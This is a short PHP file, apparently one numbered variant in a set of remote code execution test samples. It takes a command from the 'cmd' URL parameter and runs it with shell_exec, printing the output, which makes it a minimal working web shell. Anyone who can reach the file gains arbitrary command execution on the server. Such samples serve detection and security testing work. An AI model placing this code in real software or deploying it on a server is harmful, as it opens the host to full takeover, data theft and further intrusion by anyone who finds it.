<?php
// RCE test variation #156
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>